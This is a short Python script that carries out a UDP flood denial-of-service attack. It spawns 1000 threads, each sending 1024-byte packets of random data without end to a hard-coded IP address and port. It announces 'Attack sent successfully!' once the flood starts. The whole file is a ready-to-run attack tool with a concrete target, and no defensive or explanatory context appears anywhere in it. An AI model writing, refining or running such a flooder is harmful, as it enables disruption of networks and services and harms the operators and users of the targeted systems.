import socket
import random
import time
import threading
from colorama import Fore, init

init(autoreset=True)

UDP_IP = "185.107.192.21"
UDP_PORT = 51814
THREAD_COUNT = 1000

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
message_sent_lock = threading.Lock()
message_sent = False

def generate_random_data(size):
    return bytes(random.getrandbits(8) for _ in range(size))

def send_packets():
    global message_sent
    try:
        while True:
            message = generate_random_data(1024)
            sock.sendto(message, (UDP_IP, UDP_PORT))
            with message_sent_lock:
                if not message_sent:
                    print(Fore.LIGHTGREEN_EX + "[!] Attack sent successfully!")
                    message_sent = True
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "Stopped by user")
    except Exception as e:
        print(Fore.RED + f"Error: {e}")

threads = []
for i in range(THREAD_COUNT):
    thread = threading.Thread(target=send_packets)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()